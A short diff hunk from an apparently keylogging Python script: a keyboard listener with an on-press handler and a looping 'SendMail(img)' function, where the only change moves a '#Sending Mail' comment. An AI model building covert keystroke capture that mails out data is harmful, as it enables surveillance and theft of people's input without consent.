@@ -41,8 +41,8 @@ def on_press1(key):
 def listen():
     with Listener(on_press = on_press1) as listener:
         listener.join()
+#Sending Mail        
 try:
-#Sending Mail
     def SendMail(img):
         global a
         while True:
